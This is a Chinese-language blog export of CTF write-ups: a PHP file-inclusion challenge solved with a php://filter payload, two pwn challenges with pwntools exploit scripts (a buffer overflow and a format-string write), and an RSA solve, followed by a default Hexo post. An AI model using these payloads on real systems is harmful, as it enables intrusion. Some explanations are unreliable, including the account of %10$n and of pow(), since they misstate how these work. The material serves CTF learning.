[{"title":"Web","url":"/2023/03/05/web/","content":"\nWelcome\n\n# 一、[极客大挑战 2019]Secret File 1解题思路\n\n![img](https://img-blog.csdnimg.cn/img_convert/7a7ca8cd81dfdde9a0379ea84d0d335c.png)\n\n### 1.开启靶机\n\n开启靶机后进入网址，没有什么好的信息\n\n![img](https://img-blog.csdnimg.cn/img_convert/6c5094598fefd7dd7333e2632ebff1d3.png)\n\n### 2.按F12查看源代码\n\n发现了一个网址./Archive_room.php按CTRL键点击即可进入，可以看到\n\n![img](https://img-blog.csdnimg.cn/img_convert/240faba07eaf97b3e701de1e7da7fca1.png)\n\n点击这个SECRET并没有发生什么，后面倒是说“查阅结束”，那么就说明，速度很快，肉眼看不到，那我们就要借用工具burpsuite。首先下开启代理服务器\n\n### 3.使用burpsuite![img](https://img-blog.csdnimg.cn/img_convert/ec786b401fe133c346e66ee47ba7a2ab.png)\n\n![img](https://img-blog.csdnimg.cn/img_convert/efb7f0e3de717041c1ac19d352dbbc9a.png)\n\n进入到这个界面，软件中应该显示出获取的信息，点击forward直到信息中出现action.php(根据源代码提示)\n\n![img](https://img-blog.csdnimg.cn/img_convert/906cd9cf375e974f7f0ec1d4740c68a2.png)\n\n接着将这串数据发送到repeater，在repeater里我们点击Go就进入到下面的界面\n\n![img](https://img-blog.csdnimg.cn/img_convert/ca09d303bef3505fbb8cea397dd330fb.png)\n\n后面的话我们就可以输入网址http://78b3b06a-804f-46c6-8d85-8635948e27ad.node4.buuoj.cn/secr3t.php可以查看源代码（记着要将burpsuite和局域网关闭，否则是打不开的）\n\n![img](https://img-blog.csdnimg.cn/img_convert/c1b5cbae463c8b351a02d691e55dc88b.png)\n\n### 4.代码解释\n\n这是一个PHP脚本，以HTML标签开头。该脚本包含了一个PHP函数 `highlight_file(__FILE__)`，该函数可以高亮正在执行的PHP代码。\n\n然后，该脚本设置了 `error_reporting(0)`，以关闭错误报告。\n\n该脚本通过 `$_GET` 超全局变量接收一个文件名作为参数。然后它检查文件名是否包含以下任何字符串： \"../\"、\"tp\"、\"input\" 或 \"data\"。如果包含，则脚本会打印 \"Oh no!\" 并退出。这是一种安全措施，用于防止目录遍历攻击并保护服务器免受恶意文件包含的攻击。\n\n如果文件名通过了安全检查，该脚本将使用 `include` 语句包含该文件。被包含的文件的内容将作为PHP代码执行。\n\n标志存储在名为 \"flag.php\" 的文件中，该文件可能由此脚本包含。\n\n### 5.PHP伪协议\n\n看到flag.php应该联想到[php伪协议](https://segmentfault.com/a/1190000018991087)，在后面加上\n?file=php://filter/read=convert.base64-encode/resource=flag.php即可。\n\n这是因为 php://filter/read=convert.base64-encode 是一种 PHP 伪协议，用于将文件转换为 base64 格式。通过在 $_GET 超全局变量中传递 file=php://filter/read=convert.base64-encode/resource=flag.php，我们可以读取 flag.php 文件的内容并将其转换为 base64 格式。然后，我们可以将该内容解码并查看其中是否包含有用的信息。\n\n![img](https://img-blog.csdnimg.cn/img_convert/d215ff68e0fb087898bcc6696330a751.png)\n\n就会给出一堆符号的组合，显然这是base64的密文，接着在base64解密下即可求得flag\n\n```\nPCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7Mzk2MDEzYmItZjRkNC00NThjLWJmYWItYzhmODk4ZmI4Zjc0fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=\n```\n\n### 6.解密得到flag\n\nbase64在线解密网址：http://www.jsons.cn/base64/\n\n![img](https://img-blog.csdnimg.cn/img_convert/ee9459a1e82c5da4c32442d8ca09f316.png)\n\nflag为flag{396013bb-f4d4-458c-bfab-c8f898fb8f74}\n\n## 7、总结\n\n在做这道题的时候，主要是会使用burpsuite工具，并且还要了解PHP伪协议的一些知识及概念，最后还用到了一些密码里的base64，这些都需要了解一下。"},{"title":"Pwn","url":"/2023/03/05/pwn/","content":"\nWelcom\n\n# 一、level0\n\n![img](https://img-blog.csdnimg.cn/img_convert/94804d959252e33b5031fb1d2f863cdf.png)\n\n### 1.1用checksec查看\n\n下载附件，使用checksec命令查看该程序是32位还是64位，开启了哪些保护。![img](https://img-blog.csdnimg.cn/img_convert/f08a4f0a7f7d42a23a9dff948886153d.png)\n\n> **NX 代表 不可执行** (non-executable) 。它通常在 CPU 层面上启用，因此启用 NX 的操作系统可以将某些内存区域标记为不可执行。通常，缓冲区溢出漏洞将恶意代码放在堆栈上，然后尝试执行它。但是，让堆栈这些可写区域变得不可执行，可以防止这种攻击。\n\n### 1.2 ida\n\n接着我们将文件放到**IDA**64位里，用f5反汇编查看![img](https://img-blog.csdnimg.cn/img_convert/81738c64d4ff827f301111ce6955c3b6.png)\n\n代码中提示有一个vulnerable_function()函数进入查看![img](https://img-blog.csdnimg.cn/img_convert/6997c705143c0285f6d7c587636ab82c.png)\n\n显而易见此处存在栈溢出漏洞，buf的长度为128个字节（也就是0x80）但是read()函数允许往buf中输入**0x200**字节数据。\n\n> /bin/sh是一个特殊的字符串，它代表了一个Unix/Linux系统中的shell程序，通常是Bash。在pwn题中，攻击者可以通过控制程序的输入，将/bin/sh的地址作为参数传递给system函数或者execve函数，从而获取一个shell进程并执行命令。因此，/bin/sh通常被用于pwn题中的ROP（Return-oriented programming）或者其他代码执行漏洞的利用中。\n\n接着，我们shift+F12可以看到有个很可疑的/bin/sh，我们双击进去看看\n\n![img](https://img-blog.csdnimg.cn/img_convert/81b14e74550c3baab9b5d056f7b658d7.png)\n\n接着我们点击那一行后面的**callsystem**进入它的函数体\n\n![img](https://img-blog.csdnimg.cn/img_convert/cac97a368deb9ed60f0946301f9527a3.png)\n\n![img](https://img-blog.csdnimg.cn/img_convert/83f0a4d3a6264cb164ca2c775d3873b7.png)\n\n该函数调用了system(“/bin/sh”)我们可以利用此函数来get shell\n\n### **1.3整体思路：**\n\n**是向buf处输入0x80字节的数据填满buf，此时在继续输入0x80字节的数据造成溢出覆盖ebp处的数据。**\n\n**再继续输入数据把返回地址处的数据覆盖为callsystem()的地址，这样vulnerable_function()函数原本要返回到main()函数但是却返回到了callsystem()函数来执行callsystem()**\n\n### 1.4接下来开始写exp：\n\n```python\n from pwn import *\np=remote ('61.147.171.105', 54500)#连接远程\nelf = ELF('./23')#打开本地程序\npayload = b'a'*(0x80+0x8) + p64(elf.symbols['callsystem'])#构造payload 需要覆盖0x80个地址+上个ebp地址\\# 输入payload来进行操作以拿到程序的shell payload一般等于 偏移量 + 地址\np.recvuntil(\"Hello, World\\n\")#接收远程的返回\np.send(payload)#发送payload\np.interactive()\n```\n\n运行脚本得到flag!\n\n![image-20230228131023932](C:\\Users\\ASUS\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230228131023932.png)\n\n**以下是我对上面exp的一些函数的总结，这也是我正在学习的象征，虽然只能做一些简单的题，不过我会加油的。**\n\n**在编写pwn题的exp代码时，通常需要调试和测试代码，因此需要输出详细的日志信息。因此，`context.log_level=\"debug\"`可以帮助开发者更好地了解代码的执行过程和结果，从而更快地发现和解决问题。**\n\n> **p.recvuntil(string)**是pwntools库中的一个函数，用于接收程序输出中的数据，直到包含指定字符串`string`的数据出现为止。具体来说，它会等待程序输出数据，并将数据缓存到一个数据缓冲区中，直到缓冲区中包含了指定的字符串`string`为止，然后返回缓冲区中的数据。如果程序输出中没有包含指定的字符串`string`，则`p.recvuntil(string)`会一直等待，直到超时或者接收到数据为止。如果超时，则会抛出一个异常。\n>\n> 在编写pwn题的exp代码时，通常需要从程序输出中获取一些敏感信息，例如栈指针、libc的基址等等。因此，可以使用`p.recvuntil(string)`函数接收程序输出中的数据，并从中提取需要的信息。通常情况下，需要多次使用`p.recvuntil(string)`函数接收程序输出中的数据，以便于获取完整的信息和数据。\n\n**需要注意的是，在使用`p.recvuntil(string)`函数时，需要确保指定的字符串`string`是唯一的，否则可能会导致接收到错误的数据或者超时。为了避免这种情况，可以使用一些特殊的字符串或者标记来区分不同的输出数据。另外，在实际使用中，需要根据程序的具体输出格式和漏洞类型，选择合适的接收函数和接收方式，以便于获取正确的数据并编写有效的exploit代码**。\n\n> **p.sendline(payload)**是pwntools库中的一个函数，用于向程序发送数据并添加一个换行符。具体来说，它会将指定的数据`payload`发送给程序，并在数据的末尾添加一个换行符`\\n`，以便于模拟用户在终端中输入数据的行为。发送数据后，函数会等待程序的响应并将响应数据缓存到一个数据缓冲区中，然后返回缓冲区中的数据。如果程序没有响应或者响应超时，则会抛出一个异常。\n>\n> 在编写pwn题的exploit代码时，通常需要向程序发送一些特定的数据，例如缓冲区溢出的payload、格式化字符串的参数等等。使用`p.sendline(payload)`函数可以将这些数据发送给程序，并使用`\\n`换行符模拟用户输入的行为。这样可以使payload或者输入数据更加真实和有效，从而更容易绕过一些安全保护和检测机制，例如ASLR和DEP等。\n\n**需要注意的是，在使用`p.sendline(payload)`函数时，需要确保发送的数据和换行符的格式是正确的，否则可能会导致程序崩溃或者无法正常运行。为了避免这种情况，可以使用一些特殊的字符或者标记来区分不同的数据，或者使用一些工具或者脚本来自动生成payload或者输入数据。另外，在实际使用中，需要根据程序的具体输入格式和漏洞类型，选择合适的发送函数和发送方式，以便于构造有效的exploit代码。**\n\n# 二、攻防世界-CGfsb\n\n\n\n![img](https://img-blog.csdnimg.cn/img_convert/82782dcc5dbbb6e04dfb0c6b48551031.png)\n\n### 1.将文件拖入ubuntu用checksec检查保护\n\n> 1. **arch：arch是“Architecture”的缩写，表示二进制文件编译时采用的CPU架构。在安全中，arch通常用于表示二进制的CPU架构是否是适合攻击者开发shellcode的目标，因为攻击者需要知道适合攻击平台的内存偏移量和指令。因此，对于一个给定的攻击目标，知道其CPU架构可以帮助攻击者更容易地开发成功的攻击。**\n> 2. **prlro：prlro是“Partial Relro”的缩写，表示二进制是否启用了Partial Relocation Read-Only保护。这种保护机制可以阻止攻击者利用GOT表重定向攻击，因为GOT表的地址被设置为只读，攻击者无法修改它。启用PRLRO可以提高二进制的安全性。**\n> 3. **sstack：sstack是“Stack Smashing Protection”的缩写，表示二进制是否启用了栈破坏保护。栈破坏是指攻击者利用缓冲区溢出漏洞来篡改函数返回地址，从而控制程序的执行流程。启用Sstack可以在执行返回前检查栈帧中的数据完整性，以避免栈破坏攻击。**\n> 4. **nx：nx是“No Execute”的缩写，表示二进制是否启用了不可执行内存保护。不可执行内存的保护可以防止攻击者将指令载入到内存中，从而造成代码执行和攻击。启用NX可以防止许多基于内存的攻击，例如ROP攻击、缓冲区溢出等。**\n\n如下图，我们发现PIE没有保护，全局变量的地址固定\n\n![img](https://img-blog.csdnimg.cn/img_convert/58910593676779651934021c00647310.png)\n\n> **PIE”指的是“位置无关可执行文件”（Position-Independent Executable），它是一种可执行文件格式，可以在加载时动态地或静态地进行地址空间随机化。这使得攻击者更难利用缓冲区溢出等漏洞。因此，启用 PIE 可以提高程序的安全性。如果程序没有启用 PIE 保护，它的地址空间将始终是相同的，这意味着攻击者可以更容易地利用缓冲区溢出漏洞。**\n>\n> **“全局变量地址固定”意味着全局变量在内存中的地址是固定的，不会在程序的不同运行中发生变化。这使得攻击者更容易利用全局变量的漏洞，例如缓冲区溢出。因此，在可能的情况下，应该尽量避免使用全局变量，或者使用一些技术来保护它们，例如限制它们的访问范围和使用堆栈内存而不是静态内存等。**\n\n### 2.使用IDA\n\n如下图![img](https://img-blog.csdnimg.cn/img_convert/270dd1b463cd24c47f84a7758cf694b6.png)\n\n### 3.代码解释\n\n> **提供的代码是一个 C 语言程序，它会提示用户输入姓名和一条消息，并且会打印一个个性化的问候语和用户输入的消息。**\n>\n> **main` 函数初始化了一些变量，包括一个大小为 2 的数组 `buf` 和一个大小为 100 的字符数组 `s`。该函数使用 `setbuf` 函数来禁用标准输入、输出和错误流的缓冲。**\n>\n> **程序随后提示用户输入姓名，使用 `puts` 函数进行输出，并使用 `read` 函数将用户输入读取到 `buf` 数组中。然后程序再次提示用户输入消息，这次使用 `puts` 函数进行输出。用户输入的消息使用 `fgets` 函数读取到 `s` 数组中。**\n>\n> **程序接下来使用 `printf` 函数，传递 `buf` 数组作为参数，打印个性化的问候语。用户输入的消息也使用 `printf` 函数进行输出。**\n>\n> **最后，程序检查 `pwnme` 的值是否等于 8。如果是，则使用 `system` 函数执行命令 \"cat flag\" 并打印包含标志的消息。否则，程序打印一条感谢用户的消息。**\n\n但是，对于pwnme根本没有被赋值，所以应该是赋给pwnme一个8的值，但是实在是没有发现什么关于栈溢出的地方，只好寻求大佬帮忙，然后发现说是**格式化字符串漏洞**\n\n作为菜鸡的我不了解（；´д｀）ゞ，我就上网查资料。如下：\n\n> **格式化字符串漏洞是一种常见的安全漏洞，可以利用程序中使用格式化字符串函数时的不当使用而进行攻击。格式化字符串函数（例如 printf 和 sprintf）将一个格式化字符串作为输入，并使用该字符串格式化并打印数据。攻击者可以构造一个恶意格式化字符串来读取或修改程序内存中的数据。这种攻击通常利用了格式化字符串中的格式控制符（例如 %s 和 %x）来读取或修改内存内容。为了防止这种漏洞，开发人员应该注意在使用格式化字符串函数时正确处理输入，并避免将用户输入作为格式化字符串的一部部分**\n>\n> **对应代码的部分就是printf（&s）;根据我们所学知识printf(\"%s\",str);应该是这样所以我们可以通过构造合适的字符串，利用格式化字符串漏洞，实现读取、写入任意内存地址的数据等攻击**。\n\n| 控制符                 |                      描述                      |\n| ---------------------- | :--------------------------------------------: |\n| **`%c`**               |                **输出一个字符**                |\n| **`%d` / `%i`**        |             **输出一个十进制整数**             |\n| **`%e` / `%E`**        |         **用科学计数法输出一个浮点数**         |\n| **`%f` / `%F`**        |               **输出一个浮点数**               |\n| **`%g` / `%G`**        |     **根据值的大小选择使用 `%f` 或 `%e`**      |\n| **`%o`**               |             **输出一个八进制整数**             |\n| **`%p` / `%x` / `%X`** |       **输出一个指针地址、十六进制整数**       |\n| **`%s`**               |               **输出一个字符串**               |\n| **`%u`**               |          **输出一个无符号十进制整数**          |\n| **%n**                 | **将已经输出的字符数保存到它所在的参数指针中** |\n\n### 4.找出偏移量\n\n我们就用%p来进行（加上\\是为了好判断位置）\n\n![img](https://img-blog.csdnimg.cn/img_convert/002c8d29489a193f136e540ff4330f89.png)\n\n如图所示，很明显了0x61616161就是aaaa，所以偏移量就是10\n\n接下来我们就寻找pwnme的地址就可以了,根据下图我们找到了pwnme的地址为 0x0804A068\n\n![img](https://img-blog.csdnimg.cn/img_convert/9a12ca74c2c8ba02416512e90fef6204.png)\n\n### 5.编写exp\n\n完成上述之后我们就可以编写exp了，不过写了好久就是运行不出来，找资料了解到需要**%10$n**\n\n> **`%10$n` 是 C 语言中 printf 函数的一种格式化字符串控制符，用于将累计的输出字符数存储在指定的地址中。**\n>\n> **具体来说，`%10$n` 的含义如下：**\n>\n> - **`%`：格式控制符的起始标识；**\n> - **`10`：指定要存储输出字符数的地址所占的空间大小，这里是 10 个字节；**\n> - **`$`：指定当前格式控制符要操作的参数的位置，这里是第几个参数；**\n> - **`n`：表示存储输出字符数的值到指定的地址中。**\n>\n> **由此可知，`%10$n` 可以通过格式化字符串漏洞来将输出字符的数量存储在指定的地址中。具体来说，攻击者在输入中添加格式化字符串 `%10$n`，程序在处理该字符串时，会将输出字符的数量写入位于 10 号参数指定的地址中。由于格式化字符串漏洞的特性，攻击者可以构造任意的地址，因此能够获取程序的代码执行过程中的一些敏感信息。**\n\nexp如下：\n\n```python\nfrom pwn import *\np = remote('61.147.171.105', 56813)            \npayload = p32(0x0804A068) + 'ssss' + '%10$n'     \np.recvuntil(\"please tell me your name:\\n\")\np.sendline('taozi')\np.recvuntil(\"leave your message please:\\n\")\np.sendline(payload)\np.interactive()\n```\n\n如图：\n\n### ![img](https://img-blog.csdnimg.cn/img_convert/c9c90083e39b86dd189ed1bd3df55220.png)\n\n### 6.总结\n\n做这道题的时候，对于**格式化字符串**的知识要有一定了解，不然的话，就要像我一样，忙来忙去，很麻烦的\n\n如何利用格式化字符串呢？我做了一些知识总结。\n\n格式化字符串攻击（Format String Vulnerabilities，简称FSV）是指攻击者通过构造恶意格式化字符串控制符，在程序中读写不该被访问的内存区域、获取敏感信息等操作。攻击者通常利用以下方式来实施格式化字符串攻击：\n\n（1）打印栈上的数据\n\n攻击者可以通过下面的格式化字符串来读取栈上的数据：\n\n```c++\nCopyprintf(\"%s\", format_string);\n```\n\n这个格式化字符串会将栈上的数据输出到终端上，攻击者可通过逐步构造格式化字符串，读取栈上的敏感信息，甚至是卡号等机密信息。\n\n（2）任意地址写操作\n\n攻击者可以利用 `%n`(表示输出到目前为止已输出的字符数到指定内存中)格式化字符串控制符来实现任意地址写操作。攻击者需要指定目标地址位置（任意写操作）的参数编号，以及欲写入的值。例如：\n\n```c++\nCopyint x = 10;\nprintf(\"test %x%n\\n\", &x, x);\n```\n\n上例将变量 `x` 的地址作为参数，使其输出十六进制格式的地址，同时通过 `%n` 将已输出的字符数量写入到变量 `x` 中。由于攻击者可以构造目标地址参数，因此可以将任意值写入任意地址。\n\n（3）格式化字符串覆盖计数器\n\n格式化字符串的解析过程中需要一个计数器来记录当前处理的格式化字符串的位置，攻击者可以用格式化字符串覆盖计数器来对程序进行影响，例如覆盖 `printf()` 函数内的计数器 `number`，使其一直循环打印字符串：\n\n```c++\nCopyint number = 0;\nprintf(\"test %d%n\\n%s%6$d\\n\", 1, &number, \"hello\", 2, 3, 4, 5);\n```\n\n上例中，攻击者将变量 `number` 的地址作为参数，使其输出输出的数字 1，通过 `%n` 将输出字符数量写入变量 `number` 中。然后通过 `%s` 输出字符串 \"hello\"，同时用 `%6$d` 输出第 6 个参数的值（即数字 3），由于 `%6$d` 中的 $6 表示输出的是第 6 个参数，但是在前面已经输出了 1 个参数，因此将计数器覆盖为 1，从而打印死循环。\n\n由于格式化字符串攻击可对程序构成严重威胁，因此应采取以下预防措施：\n\n1. 不要相信用户提供的格式化字符串；\n2. 使用安全的输入输出函数，并严格限制输出字符串的长度；\n3. 不要让用户控制格式化字符串的转换说明符；\n4. 在开启编译选项 -Wall 的情况下编译程序，编译器会识别并警告存在的格式化字符串漏洞。"},{"title":"Crypto","url":"/2023/03/05/Crypto/","content":"\nWelcom\n\n# **一、攻防世界Crypto - 初识rsa**\n\n\n\n## 1.下载附件![img](https://img-blog.csdnimg.cn/img_convert/4398c3e509a2988046a8dbdf26053428.png)\n\n这是一道简单的rsa类型的题，我们下载附件后可以看到代码\n\n```python\nfrom Crypto.Util.number import bytes_to_long,inverse,getPrime\nfrom flag import flag\n\nm = bytes_to_long(flag)#bytes_to_long 是 Python 中的一个函数，用于将字节数组转换为整数\n#在 RSA 加密和解密中，我们需要将明文和密文表示为一个整数。因此，在进行 RSA 加密和解密时，我们需要使用 bytes_to_long 将明文和密文转换为整数，使用 long_to_bytes 将整数转换为字节数组。\np = getPrime(1024)\nq = getPrime(1024)\nn = p*q\nprint(n)\ne = 65537\n\nc = pow(m,e,n)#`pow` 是 Python 中的一个内置函数，用于计算一个数的幂。具体地，`pow(x, y, z)` 返回的结果为 `x*y % z`。其中，`x` 和 `y` 是整数，`z` 是可选的模数。\n\npq = p*(q-1)\nqp = q*(p-1)\n\nprint(\"c=\",c)\nprint(\"n=\",n)\nprint(\"pq=\",pq)\nprint(\"qp=\",qp)\n... ...//代码给出了c、n、pq、qp的值 在此省略了\n```\n\n- 关于rsa\n\n> 在RSA加密中，明文m通过公钥进行加密得到密文c，即c=m^e mod n。在RSA解密中，密文c通过私钥进行解密得到明文m，即m=c^d mod n。其中，n=p*q，p和q均为大质数，e是与(p-1)*(q-1) 互质的数，d是e在模 (p-1)*(q-1) 意义下的逆元。**加密m^e mod N =c解密 c^d mod N = m**\n\n在RSA加密算法中，phi函数（也称欧拉函数）是一个重要的参数。phi函数的值是根据选择的两个质数p和q计算出来的。phi函数的含义是小于n的正整数中与n互质的数的个数，其中**n=p*q**。phi函数的计算公式为：**phi(n) = (p-1) * (q-1)**\n\n在这里他给出的时pq和qp，并且我们知道了n，而n=pq，这里应该是大数相乘有偏差导致的，具体解决方法用pq*qp/n\n\n## 2.编写后的脚本加密\n\n```python\nfrom Crypto.Util.number import inverse,long_to_bytes\nc= ‘’\nn= ‘’\npq= ‘’\nqp= ‘’\ne = 65537\nphi = pq*qp//n\nprint(phi)\nd = inverse(e,phi)\nm = pow(c,d,n)\nprint(long_to_bytes(m))\n```\n\n### 3运行脚本得到flag\n\n![img](https://img-blog.csdnimg.cn/img_convert/55fd9903f379f9148eb7cc5d63413fb9.png)\n\n运行就可以得到flag了。"},{"title":"Hello World","url":"/2023/02/25/hello-world/","content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n**三万六千日，夜夜当秉烛，白日何短短，百年若易海。**\n\n**当你两手握着沙子的时候，你也就一定拿不到地上的那颗明珠了。**\n\n**为人如立山千仞，为学如海纳百川信心无畏，良心无愧，青春无悔撑开自信的帆，破浪向前，展示搏击风采坚定的信念持久的勤奋科学的方法成功人生能有几回搏，此时不搏待何时细节决定成败，拼搏铸就人生。**\n\n**鹰爱高飞，鸦栖一枝。鸟贵有翼，人贵有志。靠山山会倒，靠水水会流，靠自己永远不倒。欲望以提升热忱，毅力以磨平高山。只要路是对的，就不怕路远**。\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n\n**社会是大海，人生是小舟，理想和信念就是引航的`灯塔和推进的风帆。咱们在大学期间不仅仅要提高知识水平，更要坚定科学崇高的理想信念。然而理想不等于现实，理想的实现往往要透过1条充满艰难险阻的曲折之路，有赖于脚踏实地，持之以恒的奋斗。只有实践才是通往理想彼岸的桥梁**。\n\n**治学要耐得住寂寞，做人须经得起风雨。贵人之心责已，则宽；利己之心利人，则容。信念是人生之车的轮，理想是人生之舟的帆。成功终究是昨夜星辰，勤奋却是不熄的明灯。有作为，十年胜百年；无目标，百岁犹一岁。骨气、正气、与气，气爽神清；诚心、意心、热心，心宽体健。**\n\n**正能量就像给自己插上翅膀，才能飞得更高；炼造一双千里眼，才能望得更远。满载而行，即使困难重重，留下的汗水也终会获得回报；满载而行，即使艰辛与泪水并存，前方的道路也依然光明；满载而行，即使跌倒，也将有勇气迈向成功。**\n\n**我们怀揣火种走过黑暗长夜，跨过战友的遗骸，踏过荆棘和深渊，最终在累累尸骨上重新点燃了种族延续的火炬。我们这些活下来的人不需要历史来记载功勋，也无谓那些空虚华美的称颂;只要山川河流、千万英灵，见证过我们前仆后继的跋涉，和永不放弃的努力。**\n\n> 外面下着大雨，潮湿的空气令我难受，不知道过了几刻钟，我也不知道自己在干什么，似乎是在发愣，可是发愣也不是如此——思绪如麻，剪不断，理还乱。脑子里装满了噪音，我不知道自己还有多少天才能熬过头。外面的雨似乎是发现了小草有点讨厌自己了，开始离去。风雨过后，理应是美好的时候，阳光出来了，彩虹也时隐时现。听不见了这烦人的雨声，我开始朝门口走去，当我触碰到第一缕阳光的时候，我感觉到的不是光明的日子，而是一种极端的另一种日子。我似乎忘记了它原本所拥有的温度了，此时的我我只感受到了痛苦，望着不惹人爱的外面，我还是走了出去，阳光刺着我的双眼、空气抓住我的喉咙，似乎一撇一捺组成的不是那个字，而是X，似乎我不该过来。在房子里，找不出一点任何的意义，只有抱膝灯前影伴身。外面天气十分的晴朗，小鸟在欢唱、小花在跳舞。而身处房子里的我，似乎并不是很喜欢这种场景，外面耀眼的阳光却无法除去房子里的阴影。或许这就是人生吧。"}]